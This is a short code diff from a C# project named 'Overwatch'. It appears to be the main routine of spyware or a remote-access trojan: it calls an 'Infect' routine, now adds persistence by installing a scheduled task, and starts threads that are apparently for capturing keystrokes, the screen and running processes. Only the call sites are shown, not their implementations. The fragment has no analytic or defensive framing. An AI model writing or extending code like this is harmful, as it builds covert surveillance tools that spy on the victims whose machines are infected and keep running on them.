@@ -18,8 +18,10 @@ namespace Overwatch
         {
             try
             {
+
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
+                cInstallTaskScheduler.AddTask();
                 KeyTread.Start();
                 ScreenTread.Start();
                 ProcessTread.Start();
